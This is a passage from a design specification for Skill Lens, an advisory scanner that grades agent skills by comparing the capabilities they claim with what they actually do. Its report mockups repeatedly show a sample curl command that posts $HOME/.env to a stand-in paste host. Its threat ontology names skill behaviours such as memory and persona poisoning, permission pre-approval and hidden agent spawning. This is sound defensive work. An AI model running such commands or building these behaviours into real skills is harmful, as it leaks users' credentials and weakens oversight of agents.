| `static_only` | ×0.5 | Evidence found but no executable path demonstrated (e.g., pattern in prose docs). |
| `declared` | ×0.5 | Capability explicitly claimed in frontmatter/description/allowed-tools. |

Rounding: each contribution rounds half-up to whole points. Confidence below **0.6**: the finding is labeled *suspected*; suspected CRITICAL cannot trigger the confirmed-critical cap (it triggers the 40-ceiling instead) — replacing v0.3's blanket
halving, which let low-confidence criticals slip through. Declared-discount eligibility extends to the new capabilities (`persona.write`, `spawn.agent`, `network.send:messaging_human`) so honest persona-editors, schedulers, and notifiers get the same
treatment as honest network users.

Score ceilings (applied as `score = min(score, cap)`, stack by min):

| Condition | Ceiling |
| --- | --- |
| Any **confirmed** CRITICAL (conf ≥ 0.6) | ≤ 25 → F |
| Only *suspected* CRITICAL (conf < 0.6) | ≤ 40 → D, plus report flag `needs_review: true` |
| Undeclared money-touch (wallet/payment/crypto movement) | ≤ 70 → at least C/warn |
| Integrity/override attempt (permission bypass, hidden invocation, agent-config/persona/skill-tree writes) | ≤ 80 → at least C/warn |

Grades: **A ≥ 90, B ≥ 75, C ≥ 60, D ≥ 40, F < 40.** Ceilings clamp **both score and grade**: a money or integrity ceiling caps the grade at ≤ C regardless of raw points (an 80-score override skill reports grade C, not B — ceilings are verdicts, not
discounts).

`needs_review` is an orthogonal boolean report flag, **not** a fifth verdict value: set when the suspected-critical ceiling applies, or when any active HIGH+ finding has confidence < 0.6. The verdict enum remains exactly `{alert, warn, notice,
clean}`; automation gates on verdict, humans triage the flag first. With exit codes scoped to CLI verbs (§18), **verdict is the sole automation interface everywhere it exists** — CI today, the future GitHub Action, and the lingua franca when a user
asks the agent "was it bad?" in-session.

Verdict derivation (uses `effective_severity` after discounts; declared findings escalate one level weaker — disclosed risk is notice-worthy, not alarming):

```
alert  : grade == F  OR  any confirmed CRITICAL active
warn   : grade ∈ {C,D}  OR  any UNDECLARED HIGH active  OR  integrity/money ceiling applied
notice : any MEDIUM active OR declared HIGH active OR grade == B
clean  : otherwise (grade A, no active findings ≥ MEDIUM)
```

### 8.3 Worked examples (hand-checkable; byte-exact golden vectors)

| Scenario | Findings (sev·static·declared) | Arithmetic | Score | Grade·Verdict |
| --- | --- | --- | --- | --- |
| **A. Clean helper** | none | 100 | **100** | A · clean |
| **B. Mild overreach** — "formats markdown"; actually reads `.env` | MED dyn undecl −7; LOW static −(2×0.5)=−1; LOW static additional −(1×0.5)=−1 | −9 | **91** | A · notice |
| **C. Sneaky exfil** — posts env to paste site via base64 chain | CRIT dyn undecl −40; HIGH static (obfuscation) −(18×0.5)=−9 | raw 51 → confirmed-critical ceiling | **25** | F · **alert** |
| **C′. Suspected exfil** — same, conf 0.55 | CRIT suspected −40; HIGH static −9 | raw 51 → suspected-critical ceiling | **40** | D · warn ⚑ needs_review |
| **D. Declared pentest lab (street profile would be harsh; shown under `lab`)** | HIGH dyn decl −(18×0.5)=−9; MED dyn decl −(7×0.5)=−4; MED dyn decl additional −(4×0.5)=−2 | −15 | **85** | B · notice |
| **E. Rogue override** — writes agent settings to pre-approve tools | MED dyn undecl −7; LOW ×2 −2; (integrity ceiling) | raw 91 → ceiling | **80** | C · warn |
| **F. Noisy formatter (FP-prone)** | 6×LOW static → tier −6 (cap); 2×MED dyn undecl −11 | −17 | **83** | B · notice |
| **G. Undeclared wallet enumerator** | HIGH dyn undecl −18 (money-touch ceiling) | raw 82 → ceiling | **70** | C · warn |

Ordering check that motivated v2: exfil **25** ≪ declared lab **85** ≫ old-world inversion (exfil 47 > lab 30). Noise saturates: 50 LOW findings still cost exactly 6. Vectors A–G are byte-exact golden fixtures (Phase-1 exit criterion) doubling as the
`/lens scan` demo script.

### 8.4 CI contract: `--fail-on` (CLI verbs only)

`--fail-on <clean|notice|warn|alert>` (default: **none** — plain interactive scans always exit 0 unless a total error occurs; advisor stance). With `--fail-on warn`, exit 1 iff verdict ∈ {warn, alert}. SARIF/JSON consumers should gate on `verdict`,
not exit code alone. On slash/hook surfaces there is no exit code to honor — verdict in text is the contract (§18).

---

## 9. Claims, capabilities, and overreach

### 9.1 Capability ontology (families with subpaths)

```
network.read        fetch/download (GET-shaped)
network.send        upload/post/exfil-shaped; sub-tag messaging_human (channel/DM sends)
execute.shell       run commands / subprocesses
execute.code        eval / dynamic deserialization
filesystem.read     sub-tag cross_profile (paths crossing profile homes)
filesystem.write
filesystem.outside  writes beyond skill root (escalation-shaped)
credentials.read    env vars, dotfiles, keychains, tokens ($HERMES_HOME/.env included)
secrets.exfil       credentials.read × network.send correlation (E6)
persistence         cron/startup/agent-config mutation — definition names agent-native
                    schedulers explicitly (cron/jobs.json writes, Chronos-managed jobs);
                    sub-tags cron_json, chronos
surveillance        clipboard, screen, keystrokes, mic/cam
money               payments, wallets, crypto movement
obfuscation         encoding layered to evade review (not mere use of base64)
integrity.override  permission bypass, hidden invocation, memory poisoning;
                    sub-tag control_plane (config.yaml / platform_disabled / disabled-list)
persona.write       *(new)* writes to agent self-state: SOUL.md, memories/, MEMORY.md, USER.md,
                    context-injected files (AGENTS.md, CLAUDE.md, .cursorrules, .hermes.md);
                    sub-tag memory
spawn.agent         *(new)* causing additional agent execution: skill→skill chaining
                    (related_skills riding, skills/** writes, installer invocations), kanban
                    dispatch, agent-cron creation, subagent spawning; sub-tags skill_ref,
                    kanban, cron_job, subprocess_agent
```

Sub-capabilities appear in evidence tags (`network.send:paste-site`). Ontology changes are minor rule-pack versions; adding a family never silently changes old scores (weights pinned per rule). The two additions and three sub-tags close the
Hermes-precedent gap (§17); nothing else moves.

### 9.2 Claim extraction (no LLM in default path)

Three extractor groups, ordered:

1. **Field-direct** (exact): `allowed-tools` entries map to capabilities directly; `compatibility` phrases like "needs network access" claim `network.*`.
2. **Lexicon v1** (deterministic phrase mining over description/body): verb-object lexicon maps spans → claims — *fetch/download/sync/retrieve* → network.read; *upload/post/push/send/ publish/webhook* → network.send;
*run/execute/install/command/shell* → execute.shell; *read/open/scan/watch files* → filesystem.read; *write/save/generate files* → filesystem.write; *env/key/token/credential/secret* → credentials.read; *clipboard* → surveillance;
*pay/invoice/wallet/crypto* → money. **Hermes extensions**: *schedule/recurring/remind/timer* → persistence:scheduler claim; *send a message/announce/notify a channel/DM* → network.send:messaging_human; *edit/update your soul/memory/persona* →
persona.write. Each claim carries its quote span.
3. **Manifest-declaration hooks** (Hermes dialect): fallback_for_* declarations and scheduling/messaging tag clusters feed claims so declared-discount math stays honest even when prose is terse.

**Vague marketing copy** ("supercharges your workflow"): extracts zero specific claims ⇒ claim set empty ⇒ any actual capability is formally overreach. To avoid unfairly flaming terse-but-honest skills, vague-description bundles get an INFO finding
`LNS-MAN-004 "description states no concrete capabilities"` and the overreach section marks `basis: no-claims-made`. Overreach without claims is worded "undisclosed capability", distinct from "contradicts stated claim".

### 9.3 Overreach explanation without LLM (deterministic templates)

```
OVERREACH: network.send
  claimed : (nothing — description makes no capability statements)   [SKILL.md:3]
  actual  : curl -d @"$HOME/.env" https://paste.example/u            [scripts/sync.sh:42]
  because : the bundle performs an upload the manifest never mentions
  weight  : −40 (CRITICAL, dynamic evidence, undeclared)
```

Templates cite claim span + evidence span + weight line. Every number traces (T3).

---

## 10. Policy reference

Resolution order (later wins): builtin defaults → profile (`street`|`lab`) → **Hermes plugin settings** (`plugins.entries.lens.settings.*` via `ctx.get_config` — the layer configured from `config.yaml`) → global config file
(`$XDG_CONFIG_HOME/lens/policy.toml`) → project `.lens/policy.toml` → CLI/slash flags. Merge semantics: scalars override, maps deep-merge, lists replace unless prefixed `+`.

Plugin-settings keys (validated against manifest `config_schema`; mismatches warn, never fail load — host behavior): `profile`, `watch.poll`, `discord_spoilers`, `voice`, `chat_budget_chars`. Everything else lives in policy files.

```toml
# .lens/policy.toml — project overlay
profile = "street"                # street | lab  (street is default everywhere)

[score]
suspected_critical_ceiling = 40   # published defaults; overrides allowed but logged
money_ceiling = 70
integrity_ceiling = 80

[rules]
disable = []                       # e.g. ["LNS-OBS-002"]
severity_override = [
  { rule_id = "LNS-SHL-007", severity = "LOW", reason = "repo convention: Makefile curl", expires = "2026-12-01" }
]

[network]
allow_hosts = [                    # glob, public-suffix aware:
  "*.github.io",                   #   matches foo.github.io, NOT evil.github.io.evil.com
  "api.github.com",
]
allow_ips = []
deny_hosts = []                    # wins over allows; report shows DENIED-BY-POLICY marker

[[baseline]]                       # merges with .lens/baseline.toml (canonical store written
                                   # by 'lens baseline'); duplicate fingerprints resolve to the
                                   # earlier expiry; --baseline F adds read-only extra source
fingerprint = "sha256:9c41…"
reason = "docs example, not executed"
expires = "2027-01-15"             # mandatory; expired entries resurface loudly

[choir]
enabled = false                    # default off; downgrade-only contract (§4)
```

**Lab profile** (`--profile lab` or `profile = "lab"`): offensive-tooling rules (`execute.*`, `credentials.read` against RFC1918/doc ranges, `network.scan`) get the `declared` discount when the bundle declares offensive scope
(`pentest|red-team|security testing` lexicon); integrity and money ceilings remain fully in force; every discount annotated `[lab:declared-offensive]` inline. Street ignores declarations for these rules (D-STREETLAB).

**Host-list semantics (normative).** `allow_hosts`/`allow_ips` matches do not silently delete evidence: downgraded to INFO with `allow_matched` annotation (policy-visible, never secret). `deny_hosts` annotates `DENIED-BY-POLICY`, leaving
score/severity untouched — deny is a highlighter, not a multiplier. Precedence: deny > allow > standard.

Deliberately absent: user-authored `re:` regex allowlists — deferred again (R3 strengthened-defer): host idiom consistency (guard policy matching is glob-class; teaching a second sharper dialect in the same breath is avoidable cognitive tax) plus the
audit burden of user regexes, the most dangerous config primitive a security tool can ship. Globs + PSL + deny-wins cover observed cases; promote on evidence through the §15 gate.

---

## 11. Surfaces: CLI verbs, `/lens`, hooks, watch, doctor

### 11.1 Surface inventory & ownership

| Surface | Registration | Output channel | Exit codes |
| --- | --- | --- | --- |
| CLI verbs (`hermes lens <verb>`) | `ctx.register_cli_command` (argparse subparser) | Rich Console (ANSI terminal, panels per host house style) | Yes (§18) |
| Slash commands (`/lens <verb>`) | `ctx.register_command("lens", handler)`; handler `(raw_args: str) -> str \| None` | Returned string rendered by CLI **and** gateway sessions (Discord pickers via `args_hint`) | None — verdict travels in text (D-SURF) |
| Lifecycle trigger | `register_hook("on_skill_lifecycle", …)` | Observer; return discarded. Visible twin arrives via transform lane or pull | None |
| Authoring trigger | `register_hook("post_tool_call", …)` filtered to `tool_name == "skill_manage"` | Observer; notification via transform append | None |
| Result annotation lane | `register_hook("transform_tool_result", …)` on `skill_manage` results (security-guidance precedent: append, never replace meaning) | Appended sober one-liner the model relays | None |
| Watch poller | Plugin-owned thread (process lifetime) | Terminal print in CLI processes; accumulates for pull elsewhere | None |
| Machine formats | Flags on CLI/slash verbs | JSON/SARIF/NDJSON in fences or files | Via CLI only |

Slash-command conflicts with built-ins are mechanically rejected by `register_command`, so the namespace polices itself. Handlers returning `None` mean silence — Skill Lens never returns None for user-initiated verbs; unknown input gets a usage block.

### 11.2 Command reference (verbs shared by CLI and slash)

Target resolution order everywhere: installed-skill name (`<category>/<name>`, category optional) → local dir → zip → git URL → single SKILL.md → hub quarantine dir.

| Verb | Purpose | Notes |
| --- | --- | --- |
| `lens scan <target>` | Full pipeline | Flags: `--json --sarif --output F --policy P --profile street\|lab --fail-on LVL --osv --redact-paths --no-cache --baseline F --show-suppressed` |
| `lens report [name]` | Latest cached report for an installed skill | Pull channel for async scans (§11.5) |
| `lens diff <name> [<old>]` | Report-vs-report or vs installed tree | Fingerprint-stable; highlights new/resolved/changed |
| `lens autopsy <name>` | Deep narrative: per-finding walkthrough | Voices: `clinical` (default), `microscopy` in v1; `noir` deferred usage-gated (§16) |
| `lens map <target>` | Render SkillIR: files, claims vs capabilities graph | The "what did I agree to" view |
| `lens baseline <name> --reason "…" [--expires DATE]` | Write baseline suppressing current fingerprints | Reason required; entries expire |
| `lens explain-rules [--rule ID]` | Effective rule set w/ provenance; single-rule detail | D-EXPLAIN |
| `lens doctor` | Environment self-check (§11.9) | Non-destructive, offline |
| `lens watch [status]` | Status/pull only; lifecycle owned by plugin (§11.8) | `--json` emits NDJSON |
| `lens playground` | Copies the canary fixture repo for demos | Sample-data translation |
| `lens bones` | Easter egg: module tree as anatomical chart | Pure stdout art in a fence (§16) |

Flags defined once in a shared argparse spec reused by both surfaces; unknown flags produce a usage line naming the offender (never silent-None).

### 11.3 `/lens` output contract (normative)

One returned string serves CLI interactive **and** gateway platforms (Discord 2000-char max with ≈1900 split reserve; Telegram 4096 UTF-16; Slack mrkdwn renders fences but **not pipe tables**; the shared chunker preserves code fences across splits).
Therefore:

- **No ANSI escapes in slash output — ever.** Unicode box-drawing + fenced blocks only; color is exclusive to the CLI path (Rich). The string must survive Slack mrkdwn and Telegram's MarkdownV2 plain-text fallback.
- **Chat budgets: soft 1200 / hard 1800 chars** ⇒ over budget, top-3 active findings + `full report: <path>` (reports persist under `<plugin-data>/lens/reports/`). Terminal-side slash output: up to ~60 lines inline; longer renders print head + full
file path.
- Aligned plain rows inside fences; never pipe tables. Discord spoiler wrapping (`||…||`) is opt-in config (`discord_spoilers`, default **false**) — courtesy, not redaction; G4 applies underneath.
- `--json` always returns the canonical `report/1` envelope in a fenced ```json block; byte-identical determinism applies.
- **Collapsed-by-default** (Surface Principle, §1): `/lens scan` returns count-line + worst-5 findings + pointers; the full panel is the CLI's job. Slash output lands inside the conversation — paid context tokens, possibly relayed to Discord/mobile — where every
declared-row printed is pure nagging cost. Nothing hidden, everything expandable (`report`, `autopsy`).
- The coverage footer (§12) appears on slash renders too: the in-session reader is often the agent itself, and models echo salient disclaimers they render.

### 11.4 Fast-path one-liners (normative formats)

Single line; sober only (nothing themed ever appears here); ≤160 chars; ASCII punctuation; ends with a pull pointer. Statuses `ok` (cache hit), `scan` (queued cold), `skip` (coalesced), `fail`. Field order fixed, machine-greppable: `lens <status>
<name> · <facts…> · <pointer>`.

```
[A — cache hit]
lens ok web-design-guidelines · B 82/100 · notice · 1 warn 1 note · cached 12s ago · /lens report

[B — cold queued]
lens scan queued: new-skill@main · sha256 9f2ca41e · p95 400ms · /lens report new-skill when ready

[C — coalesced (watcher already covered this hash)]
lens skip web-design-guidelines · unchanged since last exam (14:02:11)

[D — engine/orchestrator error]
lens fail web-design-guidelines · unreadable target: scripts/ (permission denied) · /lens doctor
```

Delivery channels: appended via `transform_tool_result(skill_manage)`, printed by the worker thread on completion in CLI sessions, written to `events.ndjson` everywhere. Error lines reuse exact CLI stderr wording so logs stay greppable across
surfaces (D-SURF).

### 11.5 Async job model (cold scans never wedge a reply path)

State machine `queued → scanning → ready|failed`, persisted in `<plugin-data>/lens/jobs.json`; coalescing keyed by `bundle_hash`; failures say why in one line and never retry silently. Cache-hit fast paths answer synchronously (<200 ms —
gateway-safe); cold scans enqueue on the plugin worker thread (`ctx.spawn_task`) and answer with mockup B.

| Surface | Queue-time notice | Ready-time delivery |
| --- | --- | --- |
| CLI interactive session | returned one-liner (B) | worker prints delivered summary directly (established host pattern: background summaries route through `run_in_terminal`) |
| Any session, pull | same one-liner | `/lens report <name>`; later `/lens` invocations prepend `1 report ready: <name> (scanned 14:02:11)` until fetched |
| Agent-mediated install | transform lane appends queued line so the model tells the user | model relays on request; next-turn banner |
| Gateway push | n/a | **Unavailable in v0.9 — documented limitation** (no public plugin push API). Everything lands durably in `events.ndjson`; DeliveryRouter-based push is a v1.0 stretch only if owner elects the coupling |

Canonical sequence (normative):

```
user  14:02:03  agent installs skill via skill_manage (in-session)
hook  14:02:03  post_tool_call → cache miss → worker enqueues
model 14:02:03  sees appended tool-result line: "lens scan queued: new-skill · sha256 9f2ca41e
                · /lens report new-skill when ready"   (installation never delayed)
work  14:02:05  worker finishes (412 ms) → jobs.json ready · events.ndjson append
                [CLI session] thread prints: 💠 lens ready new-skill · B 84/100 · notice · 1 warn
pull  14:07:10  /lens report new-skill → compact variant or terminal panel; job cleared
```

### 11.6 Trigger architecture (advisor-safe, Hermes-native)

Skill Lens registers via `plugin.yaml` + `register(ctx)`. All triggers are observers — for two of the three the host taxonomy makes blocking structurally impossible; for the third (`pre_tool_call`) blocking is possible and refusal to touch it is the point
(T1, N1).

- **`on_skill_lifecycle`** — fires best-effort, synchronously, on created/loaded/used/patched/installed with `{action, skill_name, provenance∈{installed, agent_created, external, local, unknown}, task_id, session_id, use_count?, reused?,
reuse_after_patch?}`. Fast path: hash-cache hit emits mockup A (<200 ms); cold ⇒ enqueue (B). The hook has no user-visible output channel (observer returns collected and discarded) — it gets the ndjson record + queue side effect; its visible twin
arrives via the transform lane or next pull. Adds zero latency to installation.
- **`post_tool_call` filtered to `skill_manage`** — the authoring beat: create/edit/patch/write_file/remove_file on agent-authored skills, the population the guard's permissive `agent-created` row and default-off `guard_agent_created` leave
essentially unvetted. The host already runs a write gate (`skills.write_approval`), an audit ledger, and the advisory linter here; Skill Lens adds the depth none attempt (claimed-vs-actual) — a fourth quiet opinion that delays nothing.
- **Hub quarantine watcher** — the install seam is **not** hookable (`do_install` invokes no plugin hooks), so Skill Lens watches `skills/.hub/quarantine/` (stable staging dir, guaranteed pre-confirm pause) plus `on_skill_lifecycle(action="installed")`
post-hoc. Race-tolerant: quarantine dirs vanish on cancel/block (rmtree both paths); mid-scan disappearance yields `skip`, never an error cascade.
- **Provenance enrichment**: hook payloads carry coarse classes only; the scan step enriches from `.hub/lock.json` trust resolution before rendering the patient line (§5.1).
- **Double-scan avoidance**: cache keyed by `bundle_hash`; concurrent scans coalesce via lockfile; lifecycle skips if the watcher already reported the hash (mockup C).

### 11.7 Hub quarantine report view (co-flagship #1)

At `hermes skills install`, bundles pause in quarantine behind the guard's trust gate and the NVIDIA SkillEvaluator Tier-1 advisory — making Skill Lens the **third** opinion at that beat. Integrated display with explicit role labels is the only
arrangement that doesn't strand users reconciling three verdicts:

```
skills_guard      : gate — decides install policy (INSTALL_POLICY; not ours to touch)
SkillEvaluator T1 : advisory — warn-don't-block second opinion (PII/secrets-class confirms)
lens              : depth — claimed-vs-actual report; full micrograph via /lens report
```

Latency contract: a fast-path line (A/B) lands within the confirmation beat; the full report completes on the worker thread and surfaces via `/lens report` — the y/N prompt is never delayed for Skill Lens. Output labeled `advisory — skills_guard decides
install policy`. Hard non-coupling rules (R7): never subsume the gate (advisor≠gate); never port guard regexes into the pack (determinism + independence — patterns may be studied, attributed, recalibrated against our benign corpus, never imported
wholesale); never read/write `INSTALL_POLICY`; render-time dedupe by annotation when both fire.

### 11.8 Watch: drift detection without a daemon

Poller thread belongs to whichever process loaded the plugin; no daemon (N8).

- **Startup sweep always runs** (cheap persisted-hash comparison from `<plugin-data>/lens/watch-state.json`): catches out-of-band drift — manual `cp -r`, git pulls into `~/.hermes/skills/**` — even for users who never enable continuous polling.
Doubles as continuous-integrity checking for installed skills, which no host component performs today despite lockfile content-hashes existing.
- Continuous hash-polling (2 s → 30 s adaptive backoff, inotify accelerator, debounce 500 ms) is **opt-in** (`watch_poll` setting or `lens watch --start`); `/lens watch status` inspects.
- Session-end gap replay: deltas accumulate in `events.ndjson` + watch-state; next process start replays once:

```
lens watch: while away — 3 changes, 1 regression
  tools/web-design-guidelines  CHANGED  9f2c…a41→b7e0…
    new: LNS-NET-011 HIGH  scripts/sync.sh:42 posts data externally
    grade B(82)→F(25) · verdict notice→alert
```

Live deltas print from the poller thread in CLI sessions; in gateway processes they accumulate for pull — same honest limitation as §11.5.

### 11.9 `lens doctor` checks (numbered; exit 0 even on warnings)

One check engine, two renderers (CLI: checklist + Rich stamp + real exit codes; `/lens doctor`: same checks in-process, final line carries verdict — `doctor: OK (2 warnings) · profile street · pack 2026.08.1 ✓`; results land in `events.ndjson` for
gateway operators).

1. Rule-pack version + checksum integrity.
2. Policy parse; effective profile and **all** sources (files, plugin settings, flags).
3. Cache/plugin-data writable; schema current; quota bounds respected.
4. Hermes environment: `HERMES_HOME` discovery, plugin enabled, categorized skills tree found, hub scan-cache present, **profiles tree discovered + route table parse-checked** (per-profile deployment implications surfaced).
5. **Hook-wiring audit: asserts Skill Lens holds zero `pre_tool_call` registrations** against the host's `VALID_HOOKS` set — fails LOUDLY if any blocking wiring referencing lens exists. The advisor stance, made checkable (T1).
6. Network-isolation self-test: canned scan asserting zero sockets; where the platform lacks enforcement primitives (macOS, Termux), reports `config-audit only` honestly.
7. Synthetic lifecycle self-test: emits a canary skill-name event, asserts Skill Lens's own hook saw it (safe: observers best-effort, side-effect-free).
8. Parse-subsystem health: flags crash-loops (repeated hard kills of grammar parsing — the D-PROC caveat made observable).
9. TTY/color sanity (`NO_COLOR`, term capabilities).

---

## 12. Report formats

### 12.1 TTY / CLI (Rich panel, host house style)

Microscopy-report language, sober default (§16); border color mapped grade A/B green·blue, C/D yellow, F red, clean dim — matching how `hermes skills install` already prints its Tier-1 advisory panel, so the quarantine beat reads as one family:

```
┌─ SKILL LENS ──────────────────────────────── lens 0.9.0 · core pack 2026.08.1 ──┐
│ patient   web-design-guidelines (@vercel-labs/agent-skills · trusted)           │
│ bundle    sha256:9f2c…a41 · 6 files · 38 KB · policy: street                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│  GRADE  B   82/100      VERDICT: NOTICE                                         │
│  capabilities  net.read · fs.write · exec.shell      declared 2/3               │
├─────────────────────────────────────────────────────────────────────────────────┤
│ ! WARN   LNS-NET-011  Posts collected data to external host                     │
│          ↳ scripts/sync.sh:42                                                   │
│            curl -s -d @"$HOME/.env" https://paste.example/u                     │
│            network.send · UNDECLARED (no claim found) · confidence 0.93         │
│ ○ NOTE   LNS-OBS-002  Base64 blob decoded at runtime (static evidence only)     │
│          ↳ scripts/install.py:17                                                │
│ ○ NOTE   LNS-MAN-004  Description states no concrete capabilities               │
│          ↳ SKILL.md:3                                                           │
├─────────────────────────────────────────────────────────────────────────────────┤
│ score math: 100 −40(crit cap) … see --json .score_math   [lab annotations: 0]   │
│ advisor only — lens never blocks installs. clean scan ≠ safe skill.             │
│ next: lens autopsy web-design-guidelines · lens explain-rules --rule LNS-NET-011│
└─────────────────────────────────────────────────────────────────────────────────┘
· static analysis only — runtime-injected instructions (tool output) are out of scope · lens explain coverage
```

Rules: findings sorted by effective severity then rule_id; snippets truncated to 100 cols with secret-redaction; `NO_COLOR`/`--plain` strips box-drawing to ASCII headers; suppressed findings shown only with `--show-suppressed`. The patient line
renders hub provenance as annotation (D-PROV) — present for hub-installed bundles, field omitted for unprovenanced targets.

### 12.2 Chat compact variant (`/lens` via gateway; fenced, ≤1200 chars target)

```
SKILL LENS 0.9.0 · pack 2026.08.1
patient : web-design-guidelines (@vercel-labs/agent-skills · trusted)
bundle  : sha256:9f2c…a41 · 6 files · 38 KB · policy street
grade   : B 82/100 · verdict NOTICE
caps    : net.read · fs.write · exec.shell (declared 2/3)

! WARN LNS-NET-011 posts data externally
      scripts/sync.sh:42 — network.send · UNDECLARED · conf 0.93
○ NOTE LNS-OBS-002 base64 blob decoded at runtime — install.py:17

advisor only — lens never blocks installs. clean scan ≠ safe skill.
next: /lens autopsy web-design-guidelines · /lens report (full)
· static analysis only — runtime-injected instructions (tool output) are out of scope · lens explain coverage
```

Transformation table (TTY → chat): outer box → fence; snippet column capped 80 cols; score-math line dropped (`--json .score_math` and `explain-rules` remain the audit paths); next-steps ≤2; suppressed findings never shown beyond a top-level count.
Everything fenced, so the chunker's fence-preserving splits handle multi-chunk with no special handling.

### 12.3 JSON (`--json`, stable schema `report/1`)

Envelope: `{schema:"report/1", tool:{…}, target:{bundle_hash,…}, provenance:{annotation}, policy:{profile,sources[]}, rule_pack:{name,version,checksum}, score:{value,grade,verdict,
needs_review,score_math:[{finding,weight,modifiers[],tier_cap_applied,ceiling_applied}]}, findings:[…], suppressed_count, claims:[], notes[]}`. `score_math` makes T3 machine-checkable. Byte-identical for same inputs (D-DETERMIN).

**Canonicalization (normative).** Volatile observations — wall-clock timestamps and per-stage timings — go to a *sidecar* object (`"_meta": {generated_at, durations_ms}`) excluded from the hashed/canonical form. Golden tests byte-compare the
canonical envelope only; `_meta` is present for humans, never compared. No other key may contain time-, path-prefix-, locale-, or environment-dependent values. Any future `ctx.llm`-touched object is excluded by the same mechanism (`llm_touched=true`,
T2).

### 12.4 SARIF 2.1.0 (`--sarif`)

| Skill Lens | SARIF |
| --- | --- |
| tool | `driver.name="Skill Lens"`, `version`, `informationUri`, rules array (per rule_id: id, shortDescription, fullDescription, helpUri, properties.{capability,defaultSeverity,weight}) |
| verdict alert/warn | `level: "error"/"warning"` |
| verdict notice/clean findings | `level: "note"` |
| score | `invocations[0].executionSuccessful` + `properties.lens.score`, `.grade`, `.verdict` |
| fingerprint | `result.partialFingerprints.lensPrimaryFingerprint` (GitHub code-scanning compatible) |
| location/snippet | standard `physicalLocation.region` (redacted snippet) |
| suppressed | `result.suppressions[]` with reason + expiration |

### 12.5 Share cards — CUT (owner arbitration)

**Rejected outright as an overfeature** (HQ O3): no exportable scan artifacts in any version — no SVG posters, plates/themes, `/lens card`, `--card`, or `card_theme`. Lens renders stat lines and reports on its own surfaces. Text below retained as archived design heritage only.

Cards are static SVG artifacts written to disk — generated with no TTY assumptions since the natural invocation is `/lens card <name>` mid-chat; chat surfaces receive the file path (plugins have no media-attachment API in v0.9). Guardrails per §16;
G4/G5 apply.

### 12.6 Coverage footer (normative)

Every report surface carries a one-line, byte-stable coverage footer (R5):

```
· static analysis only — runtime-injected instructions (tool output) are out of scope · lens explain coverage
```

The literal is frozen so golden tests can assert it byte-for-byte on TTY panels, chat/slash renders (§11.3), and autopsy narratives alike — the in-session reader is often the agent itself (N6). The full limitations block renders behind `--limitations`. Fast-path lifecycle one-liners (§11.4) are exempt: they are status lines, not reports.

---

## 13. Roadmap

**v0.9 (this spec) — Hermes-only.** Pure-Python plugin (`hermes plugins install`):

- Scan (CLI panel / chat compact / JSON / SARIF), scoring v2 with golden vectors A–G, street/lab, policy layers (files + plugin settings), baselines.
- Triggers: `on_skill_lifecycle` + `post_tool_call(skill_manage)` + hub-quarantine watcher; startup sweep always-on, continuous watch opt-in; `/lens` slash first-class; async job model (jobs.json, events.ndjson).
- Core rule pack ~40 rules — every rule ships golden TP+FP fixtures per §15 (depth beats count); includes the Hermes-precedent set budgeted in §17 (~27–30 rules: persona/memory, chaining, metadata.hermes abuse, control-plane, agent-cron, channels,
profile-cross).
- Engines: E1 Hermes-dialect core data; E4/E5 AST via declared `python_dependencies` with doctor active/degraded reporting and the golden-tested line-scanner fallback first-class (D-PARSE pinned lane; AST demotes to v1.0 if delivery constraint
doesn't clear).
- Choir contract + config stub only (zero adapters). Doctor (9 checks). Playground fixture repo. No daemon; gateway push documented-unavailable.

**v1.0 (hardening).** Cross-file taint (E4/E5); subprocess parse-isolation escape hatch if field crashes appear; perf p95 cold 250 ms; community pack loading with SHA pins; standalone console-script packaging of the same engine (PyPI, `lens` alias)
for CI; GitHub Action + SARIF upload; **LLM second-opinion promotion eval** — the *only* model access in any version (narrator cut by owner arbitration: explaining reports is the consuming agent's native job): opt-in `/lens second-opinion` (`choir.llm` downgrade-only adapter over `ctx.llm`, findings tagged `llm_touched`, outside the canonical envelope); optional DeliveryRouter stretch for proactive gateway push (hinges on the still-missing plugin push API — elected or rejected by owner).

**v1.1 (ecosystem + first port).** Signature-awareness (verify OMS-style detached signatures *if present*, surface result, never require); MCP manifest mapping via `map`; **first external port** (Claude Code or OpenCode adapter over the same engine —
the engine is portable; v0.9 shipped no adapter by design); upstream-scanner choir adapters (skills_guard interop per R7 if elected); `bones`/self-scan graduate.

**Not v1 (explicit non-goals, revisit only with new evidence)** — install interception/blocking; registry trust scores/publisher reputation; hosted dashboard; telemetry of any kind; LLM-required analysis in the default path; sandboxed
execution/emulation of skill code; GUI app; daemon processes.

---

## 14. Privacy guarantees

| ID | Guarantee | Enforcement |
| --- | --- | --- |
| G1 | Default path opens **zero network sockets** — zero *direct* egress; no independent network path | CI: pytest-socket around the package's suite (canned scans socket-denied) + import-contract test ("no network imports"). Regression = build failure. Honest scope (R2): certifies no independent path; the host's own `ctx.llm` lane is out of scope by definition and unused by default |
| G2 | Any network feature opt-in, named, logged in-report (`enriched: true`, e.g. `--osv`) | Code review gate + runtime banner |
| G3 | **No telemetry, ever** — no counters, pings, update checks | Import-contract test: no network imports in the default dependency closure |
| G4 | Secrets never rendered in full in any format; snippets redacted by E7's detector before serialization | Property tests: known-key corpus absent from outputs |
| G5 | `--redact-paths` replaces user/path identifiers with stable pseudonyms in all formats | Golden tests |
| G6 | Caches/state under `<HERMES_HOME>/plugin-data/lens/` and user XDG dirs; nothing leaves the machine; uninstall = delete dirs. Layout documents coexistence with hub `.hub/scan-cache/` — never collide, never reuse (different engines, semantics). Plugin state is **profile-scoped** by host design: per-profile views isolated; cross-profile correlation needs an explicit shared absolute path, shipped in no default mode | Documented layout + doctor #3/#4 |

Standing note (review-gated, not just documented): the truth path contains no model code. If model access ships (choir.llm second-opinion only — no narrator exists): consent-gated per call, redacted-payload-only, `ctx.llm`-exclusive, downgrade-only in effect, outside determinism guarantees (§13).

---

## 15. Rule-pack governance

- **Core pack**: YAML rule data in-repo, traveling version-pinned with the plugin via git tags (`YYYY.MM.N`); changelog required; release checksums signed; `rules verify` checks. Engine + pack versions move together by construction (D-RULEOWN).
- **Rule lifecycle**: `draft → rc → active → deprecated (≥2 minor releases) → removed`. Every rule MUST ship: rationale, ≥1 true-positive golden fixture, ≥1 benign lookalike negative fixture (FP guard), capability + severity + weight, remediation
text. Missing negatives block merge. Negative fixtures for the Hermes-precedent set draw on real in-tree skills studied during threat modeling (benign journaling, rich-tagged, legit scheduler, config-declaring, persona-tooling) — each must scan
clean-or-annotated.
- **Change classes**: new rule = patch bump; weight/severity change = minor bump + changelog rationale (scores shift visibly; report embeds pack version); IR/schema break = major bump. Determinism is per-plugin-version; cross-tag comparisons are
changelog-mediated.
